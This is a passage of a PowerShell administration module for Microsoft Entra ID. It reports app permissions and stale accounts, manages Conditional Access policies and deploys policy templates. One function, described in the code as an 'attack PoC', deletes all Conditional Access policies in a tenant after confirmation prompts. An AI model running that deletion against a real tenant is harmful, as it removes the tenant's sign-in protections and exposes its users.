}



function New-DCEntraIDAppPermissionsReport {
    <#
        .SYNOPSIS
            Generate a report containing all Entra ID Enterprise Apps and App Registrations with API permissions (application permissions only) in the tenant.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Entra ID Enterprise Apps and App Registrations with API permissions (application permissions only) and generate a report. The report includes app names, API permissions, secrets/certificates, and app owners.

            The purpose is to find vulnerable applications and API permissions in Entra ID.

            Applications marked with 'AppHostedInExternalTenant = False' also has a corresponding App Registration in this tenant. This means that App Registration Owners has the same permissions as the application.
            
        .INPUTS
            None

        .OUTPUTS
            Entra ID apps with API permissions.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            # Get all API application permissions assigned to applications in tenant.
            New-DCEntraIDAppPermissionsReport

        .EXAMPLE
            # Look for sensitive permissions.
            $Result = New-DCEntraIDAppPermissionsReport
            $Result | where RoleName -in 'RoleManagement.ReadWrite.Directory', 'Application.ReadWrite.All', 'AppRoleAssignment.ReadWrite.All'

        .EXAMPLE
            # Export report to Excel for further filtering and analysis.
            $Result = New-DCEntraIDAppPermissionsReport
            $Path = "$((Get-Location).Path)\Entra ID Enterprise Apps Report $(Get-Date -Format 'yyyy-MM-dd').xlsx"
            $Result | Export-Excel -Path $Path -WorksheetName "Enterprise Apps" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show
    #>



    # ----- [Initializations] -----

    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Application.Read.All', 'Directory.Read.All' -Verbose


    # Service Principals (shadow apps representing apps in any tenant, this or 3rd party).
    Write-Verbose -Verbose -Message "Fetching service principals..."
    $ServicePrincipals = Get-MgServicePrincipal -All | ConvertTo-Json -Depth 10 | ConvertFrom-Json

    # Applications (apps registered and hosted in this tenant, used in this tenant or shared with others).
    Write-Verbose -Verbose -Message "Fetching app registrations..."
    $Applications = Get-MgApplication -All | ConvertTo-Json -Depth 10 | ConvertFrom-Json

    # App roles.
    Write-Verbose -Verbose -Message "Fetching API permissions..."
    $AppRoles = Find-MgGraphPermission -All
    

    # Application permissions.
    Write-Verbose -Verbose -Message "Going through $($ServicePrincipals.Count) applications..."
    $APIPermissions = foreach ($ServicePrincipal in $ServicePrincipals) {
        $Permissions = (Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipal.Id)/appRoleAssignments" | ConvertTo-Json -Depth 10 | ConvertFrom-Json).value

        $Id = ($Applications | where appId -eq $ServicePrincipal.appId).id
        $Owners = $null

        if ($Id) {
            $Owners = ((Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/applications/$Id/owners" | ConvertTo-Json -Depth 10 | ConvertFrom-Json).value).userPrincipalName | Format-List | Out-String
        }
        
        $publisherDomain = ($Applications | where appId -eq $ServicePrincipal.appId).publisherDomain

        $AppCertificates = ($Applications | where appId -eq $ServicePrincipal.appId).keyCredentials | Format-Table -Property displayName, startDateTime, endDateTime | Out-String

        $AppSecrets = ($Applications | where appId -eq $ServicePrincipal.appId).passwordCredentials | Format-Table -Property displayName, startDateTime, endDateTime | Out-String

        foreach ($Permission in $Permissions) {
            $AppRole = $AppRoles | where Id -eq $Permission.appRoleId

            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Permission.principalDisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "ClientID" -Value $ServicePrincipal.appId
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Owners" -Value $Owners
            $CustomObject | Add-Member -MemberType NoteProperty -Name "SignInAudience" -Value $ServicePrincipal.signInAudience
            $CustomObject | Add-Member -MemberType NoteProperty -Name "AppHostedInExternalTenant" -Value ($publisherDomain -eq $null)
            $CustomObject | Add-Member -MemberType NoteProperty -Name "AppCertificates" -Value $AppCertificates
            $CustomObject | Add-Member -MemberType NoteProperty -Name "AppSecrets" -Value $AppSecrets
            $CustomObject | Add-Member -MemberType NoteProperty -Name "API" -Value $Permission.resourceDisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "RoleId" -Value $Permission.appRoleId
            $CustomObject | Add-Member -MemberType NoteProperty -Name "RoleName" -Value $AppRole.Name
            $CustomObject | Add-Member -MemberType NoteProperty -Name "RoleAdded" -Value $Permission.createdDateTime
            $CustomObject | Add-Member -MemberType NoteProperty -Name "RoleDescription" -Value $AppRole.Description
            $CustomObject
        }
    }

    $APIPermissions
    
    
    Write-Verbose -Verbose -Message "Done!"
}



function New-DCEntraIDStaleAccountReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing all stale Entra ID accounts.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Entra ID users who has not signed in for a specific number of days, and exports an Excel report. Some users might not have a last sign-in timestamp at all (maybe they didn't sign in or maybe they signed in a very long time ago), but they are still included in the report.

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/

            The following Microsoft Graph API permissions are required for this script to work:
                Directory.Read.All
                AuditLog.Read.All
            
            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force
            
            Also, the user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Global Reader, Security Admin, Security Reader, etc).
            
        .PARAMETER ClientID
            Client ID for the Entra ID application with Microsoft Graph permissions.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application with Microsoft Graph permissions.

        .PARAMETER LastSeenDaysAgo
            Specify the number of days ago the account was last seen. Note that you can only see as long as your Entra ID sign-in logs reach (30 days by default).

        .PARAMETER OnlyMembers
            Only include member accounts (no guest accounts) in the report.

        .PARAMETER OnlyGuests
            Only include guest accounts (no member accounts) in the report.

        .PARAMETER IncludeMemberOf
            Add a column with all group/teams memberships.

        .INPUTS
            None

        .OUTPUTS
            Excel report with all stale Entra ID accounts.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Parameters = @{
                ClientID = ''
                ClientSecret = ''
                LastSeenDaysAgo = 30
            }

            New-DCEntraIDStaleAccountReport @Parameters


            $Parameters = @{
                ClientID = ''
                ClientSecret = ''
                LastSeenDaysAgo = 10
                OnlyGuests = $true
                IncludeMemberOf = $true
            }
            New-DCEntraIDStaleAccountReport @Parameters
    #>



    # ----- [Initializations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $false)]
        [int]$LastSeenDaysAgo = 30,

        [parameter(Mandatory = $false)]
        [switch]$OnlyMembers,

        [parameter(Mandatory = $false)]
        [switch]$OnlyGuests,

        [parameter(Mandatory = $false)]
        [switch]$IncludeMemberOf
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Connect to Microsoft Graph with delegated credentials.
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
    }

    $AccessToken = Connect-DCMsGraphAsDelegated @Parameters


    # GET data.
    $GraphUri = ''

    if ($OnlyMembers) {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses&`$filter=userType eq 'Member'"
    } elseif ($OnlyGuests) {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses&`$filter=userType eq 'Guest'"
    } else {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses"
    }

    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = $GraphUri
    }

    $Result = Invoke-DCMsGraphQuery @Parameters


    # Format the result.
    $Result2 = foreach ($User in $Result) {
        # Compare sign in date against non-interactive sign-in date.
        try {
            $lastSignInDateTime = Get-Date -Date $User.signInActivity.lastSignInDateTime
        } catch {
            $lastSignInDateTime = $null
        }

        try {
            $lastNonInteractiveSignInDateTime = Get-Date -Date $User.signInActivity.lastNonInteractiveSignInDateTime
        } catch {
            $lastNonInteractiveSignInDateTime = $null
        }

        $LastSignInActivity = Get-Date
        
        if ($lastNonInteractiveSignInDateTime -gt $lastSignInDateTime) {
            $LastSignInActivity = $lastNonInteractiveSignInDateTime
        } else {
            $LastSignInActivity = $lastSignInDateTime
        }


        # Include group membership (might be slow).
        $MemberOf = ""

        if ($IncludeMemberOf) {
            $GraphUri = "https://graph.microsoft.com/beta/users/$($User.id)/memberOf"

            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = $GraphUri
            }
            
            $Groups = Invoke-DCMsGraphQuery @Parameters

            $MemberOf = foreach ($Group in $Groups) {
                if ($Groups.count -gt 1) {
                    "$($Group.displayName)"
                } else {
                    "$($Group.displayName; )"
                }
            }
        }


        # Filter and format stale accounts.
        if ($null -eq $LastSignInActivity -or (Get-Date -Date $LastSignInActivity) -lt ((Get-Date -Date (Get-Date -Format 'yyyy-MM-dd')).AddDays(-$LastSeenDaysAgo))) {
            $CustomObject = New-Object -TypeName psobject

            $CustomObject | Add-Member -MemberType NoteProperty -Name "LastSignInActivity" -Value $LastSignInActivity

            $CustomObject | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $User.DisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "userPrincipalName" -Value $User.userPrincipalName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "userType" -Value $User.userType
            $CustomObject | Add-Member -MemberType NoteProperty -Name "accountEnabled" -Value $User.accountEnabled
            $CustomObject | Add-Member -MemberType NoteProperty -Name "onPremisesSyncEnabled" -Value $User.onPremisesSyncEnabled

            if ($User.assignedLicenses.skuId) {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "assignedLicenses" -Value $true
            } else {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "assignedLicenses" -Value $false
            }

            $CustomObject | Add-Member -MemberType NoteProperty -Name "companyName" -Value $User.companyName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "department" -Value $User.department
            $CustomObject | Add-Member -MemberType NoteProperty -Name "country" -Value $User.country

            if ($IncludeMemberOf) {
                $CustomObject | Add-Member -MemberType NoteProperty -Name "GroupMembership" -Value $MemberOf.ToString()
            }

            $CustomObject | Add-Member -MemberType NoteProperty -Name "id" -Value $User.id

            $CustomObject
        }
    }

    $Result2 = $Result2 | Sort-Object LastSignInActivity

    Write-Verbose -Verbose -Message "Found $($Result2.Count) stale user accounts in Entra ID."


    # Export the report to Excel.
    Write-Verbose -Verbose -Message "Exporting report to Excel..."
    $Path = "$((Get-Location).Path)\Stale Accounts $(Get-Date -Format 'yyyy-MM-dd').xlsx"
    $Result2 | Export-Excel -Path $Path -WorksheetName "Stale Accounts" -BoldTopRow -FreezeTopRow -AutoFilter -AutoSize -ClearSheet -Show


    Write-Verbose -Verbose -Message "Saved $Path"
    Write-Verbose -Verbose -Message "Done!"
}



function Get-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            List all Conditional Access policies in the tenant.

        .DESCRIPTION
            List all Conditional Access policies in the tenant.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only show the policies with this prefix. The filter is case sensitive.

        .PARAMETER ShowTargetResources
            Show included and excluded resources in output. Only relevant without -Details.

        .PARAMETER Details
            Include policy details in output.

        .PARAMETER NamesOnly
            Show names only in output.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCConditionalAccessPolicies

        .EXAMPLE
            Get-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $false)]
        [switch]$ShowTargetResources,

        [parameter(Mandatory = $false)]
        [switch]$Details,

        [parameter(Mandatory = $false)]
        [switch]$NamesOnly
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    

    # Get all existing policies.
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json

    Write-Verbose -Verbose -Message "Fetching Conditional Access policies..."

    if ($Details) {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject | Add-Member -MemberType NoteProperty -Name "State" -Value $Policy.State
                $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $Policy.CreatedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $Policy.ModifiedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Conditions" -Value ($Policy.Conditions | ConvertTo-Json)
                $CustomObject | Add-Member -MemberType NoteProperty -Name "GrantControls" -Value ($Policy.GrantControls | ConvertTo-Json)
                $CustomObject | Add-Member -MemberType NoteProperty -Name "SessionControls" -Value ($Policy.SessionControls | ConvertTo-Json)
                $CustomObject
            }
        }

        $Result | Format-List
    } elseif ($NamesOnly) {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject
            }
        }

        $Result
    } else {
        $Result = foreach ($Policy in $ExistingPolicies) {
            if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
                $CustomObject = New-Object -TypeName psobject
                $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $Policy.DisplayName
                $CustomObject | Add-Member -MemberType NoteProperty -Name "State" -Value $Policy.State
                $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $Policy.CreatedDateTime
                $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $Policy.ModifiedDateTime

                if ($ShowTargetResources) {
                    $CustomObject | Add-Member -MemberType NoteProperty -Name "TargetResources" -Value ($Policy.Conditions.Users | ConvertTo-Json -Depth 5)
                }

                $CustomObject
            }
        }


        if ($ShowTargetResources) {
            $Result | Format-List
        } else {
            $Result | Format-Table
        }
    }
    

    Write-Verbose -Verbose -Message "Done!"
}



function Remove-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            Delete ALL Conditional Access policies in a tenant.

        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!

            This CMDlet uses Microsoft Graph to automatically delete all Conditional Access policies in a tenant. It was primarily created to clean-up lab tenants, and as an attack PoC.
            
            This CMDlet will prompt you for confirmation multiple times before deleting policies.
            
        .PARAMETER PrefixFilter
            Only delete the policies with this prefix. The filter is case sensitive.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Remove-DCConditionalAccessPolicies

        .EXAMPLE
            Remove-DCConditionalAccessPolicies -PrefixFilter 'TEST - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = ''
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    # Prompt for confirmation:
    if ($PrefixFilter -ne '') {
        $title    = 'Confirm'
        $question = "Do you want to remove all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL THESE POLICIES WILL BE DELETED!!"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        $title    = 'Confirm'
        $question = "Do you want to remove all Conditional Access policies in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'? WARNING: ALL POLICIES WILL BE DELETED!!"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }
    

    # Prompt for confirmation:
    $title    = 'Confirm'
    $question = "ARE YOU REALLY REALLY SURE?"
    $choices  = '&Yes', '&No'

    $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
    if ($decision -eq 0) {
        Write-Host ""
        Write-Verbose -Verbose -Message "Starting deletion..."
    } else {
        return
    }


    # Delete all existing policies.
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {
            Start-Sleep -Seconds 1
            Write-Verbose -Verbose -Message "Deleting '$($Policy.DisplayName)'..."
            $GraphUri = "https://graph.microsoft.com/beta/identity/conditionalAccess/policies/$($Policy.Id)"

            Invoke-MgGraphRequest -Method 'DELETE' -Uri $GraphUri -ErrorAction SilentlyContinue | Out-Null
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Rename-DCConditionalAccessPolicies {
    <#
        .SYNOPSIS
            Rename Conditional Access policies that matches a specific prefix.

        .DESCRIPTION
            This command helps you to quickly rename a bunch of Conditional Access policies by searching for a specific prefix.

            If you dontt specify a PrefixFilter, ALL policies will be modified to include the new prefix .
            
        .PARAMETER PrefixFilter
            Only toggle the policies with this prefix. The filter is case sensitive.

        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.
            
        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Rename-DCConditionalAccessPolicies -PrefixFilter 'PILOT - ' -AddCustomPrefix 'PROD - '

        .EXAMPLE
            Rename-DCConditionalAccessPolicies -PrefixFilter 'GLOBAL - ' -AddCustomPrefix 'REPORT - GLOBAL - '

        .EXAMPLE
            Rename-DCConditionalAccessPolicies -AddCustomPrefix 'OLD - '
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = '',

        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = ''
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.ReadWrite.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose


    if ($PrefixFilter -eq '') {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to add prefix '$AddCustomPrefix' to ALL Conditional Access policies in tenant '$(((Get-MgContext).Account.Split('@'))[1] )'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    } else {
        # Prompt for confirmation:
        $title    = 'Confirm'
        $question = "Do you want to rename all Conditional Access policies with prefix '$PrefixFilter' in tenant '$(((Get-MgContext).Account.Split('@'))[1] )' to '$AddCustomPrefix'?"
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Write-Host ""
        } else {
            return
        }
    }
    

    # Modify all existing policies.
    Write-Verbose -Verbose -Message "Looking for Conditional Access policies to rename..."
    $ExistingPolicies = (Invoke-MgGraphRequest -Method GET -Uri 'https://graph.microsoft.com/beta/identity/conditionalAccess/policies').value | ConvertTo-Json -Depth 10 | ConvertFrom-Json


    foreach ($Policy in $ExistingPolicies) {
        if ($Policy.DisplayName.StartsWith($PrefixFilter)) {

            if ($PrefixFilter -eq '') {
                Write-Verbose -Verbose -Message "Adding prefix '$AddCustomPrefix' to policy '$($Policy.DisplayName)'..."

                # Rename policy:
                $params = @{
                    DisplayName = "$AddCustomPrefix$($Policy.DisplayName)"
                }
                
                Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                Start-Sleep -Seconds 1
            } else {
                Write-Verbose -Verbose -Message "Renaming '$($Policy.DisplayName)' to '$($Policy.DisplayName -replace $PrefixFilter, $AddCustomPrefix)'..."

                # Rename policy:
                $params = @{
                    DisplayName = "$($Policy.DisplayName -replace $PrefixFilter, $AddCustomPrefix)"
                }
                
                Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $Policy.Id -BodyParameter $params

                Start-Sleep -Seconds 1
            }
        }
    }


    Write-Verbose -Verbose -Message "Done!"
}



function Get-DCNamedLocations {
    <#
        .SYNOPSIS
            List Named Locations in the tenant.

        .DESCRIPTION
            List Named Locations in the tenant.

            You can filter on a name prefix with -PrefixFilter.
            
        .PARAMETER PrefixFilter
            Only show the named locations with this prefix. The filter is case sensitive.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            Get-DCNamedLocations

        .EXAMPLE
            Get-DCNamedLocations -PrefixFilter 'OFFICE-'

        .EXAMPLE
            # List all trusted IP addresses.
            (Get-DCNamedLocations | where isTrusted -eq $true).ipRanges | Select-Object -Unique | Sort-Object

        .EXAMPLE
            # List all countries.
            (Get-DCNamedLocations).countriesAndRegions | Select-Object -Unique | Sort-Object
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$PrefixFilter = ''
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion -Verbose


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule -Verbose


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'Policy.Read.ConditionalAccess', 'Policy.Read.All', 'Directory.Read.All' -Verbose
    

    # Get all named locations.
    $NamedLocations = Get-MgIdentityConditionalAccessNamedLocation

    Write-Verbose -Verbose -Message "Fetching Named Locations..."

    $Result = foreach ($NamedLocation in $NamedLocations) {
        if ($NamedLocation.DisplayName.StartsWith($PrefixFilter)) {
            $CustomObject = New-Object -TypeName psobject
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value $NamedLocation.DisplayName
            $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value $NamedLocation.Id
            $CustomObject | Add-Member -MemberType NoteProperty -Name "CreatedDateTime" -Value $NamedLocation.CreatedDateTime
            $CustomObject | Add-Member -MemberType NoteProperty -Name "ModifiedDateTime" -Value $NamedLocation.ModifiedDateTime
            $CustomObject | Add-Member -MemberType NoteProperty -Name "isTrusted" -Value $NamedLocation.AdditionalProperties.isTrusted
            $CustomObject | Add-Member -MemberType NoteProperty -Name "ipRanges" -Value $NamedLocation.AdditionalProperties.ipRanges.cidrAddress
            $CustomObject | Add-Member -MemberType NoteProperty -Name "countriesAndRegions" -Value $NamedLocation.AdditionalProperties.countriesAndRegions
            $CustomObject | Add-Member -MemberType NoteProperty -Name "countryLookupMethod" -Value $NamedLocation.AdditionalProperties.countryLookupMethod
            $CustomObject | Add-Member -MemberType NoteProperty -Name "includeUnknownCountriesAndRegions" -Value $NamedLocation.AdditionalProperties.includeUnknownCountriesAndRegions
            $CustomObject
        }
    }

    $Result
    

    Write-Verbose -Verbose -Message "Done!"
}



function Invoke-DCConditionalAccessGallery {
    <#
        .SYNOPSIS
            Select policies from a list of Entra ID Conditional Access templates, and deploy them in report-only mode.

        .DESCRIPTION
            Select policies from a list of Entra ID Conditional Access templates, and deploy them in report-only mode.

            The script will automatically create any missing groups, named locations, country lists, and terms of use, and replace the names in the JSON with the corresponding IDs.

            It will also output the result of the policy creation in JSON-format.

        .PARAMETER AddCustomPrefix
            Adds a custom prefix to all policy names.

        .PARAMETER AutoDeployIds
            Specify list of policy IDs to auto-deploy (non-interactive deployment). This parameter is only used for automated deployments.

        .PARAMETER SkipDocumentation
            Skip the documentation part of the script. There will be no Markdown file produced.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/

        .EXAMPLE
            Invoke-DCConditionalAccessGallery

        .EXAMPLE
            Invoke-DCConditionalAccessGallery -AddCustomPrefix 'PILOT - '

        .EXAMPLE
            Invoke-DCConditionalAccessGallery -SkipDocumentation -AutoDeployIds 1010, 1020, 1030, 2010, 2020
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $false)]
        [string]$AddCustomPrefix = '',

        [parameter(Mandatory = $false)]
        [int[]]$AutoDeployIds,

        [parameter(Mandatory = $false)]
        [switch]$SkipDocumentation
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Declarations] -----

    <#
    Syntax:
    "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
    "ENTRAIPLIST_Corporate Network_ENTRAIPLIST"
    "ENTRACOUNTRYLIST_High-Risk CountriesxxKPxxRUxxIR_ENTRACOUNTRYLIST"
    "ENTRATERMSOFUSE_Terms of Use_ENTRATERMSOFUSE"
    #>

    # Conditional Access policy templates array.
    $ConditionalAccessTemplates = @()

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1010"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1010 - BLOCK - Legacy Authentication"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy blocks all connections from insecure legacy protocols like ActiveSync, IMAP, POP3, etc. Blocking legacy authentication, together with MFA, is one of the most important security improvements your can do in the cloud."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Excluded from Legacy Authentication Block_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "exchangeActiveSync",
            "other"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1010 - BLOCK - Legacy Authentication",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1020"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1020 - BLOCK - Device Code Auth Flow"
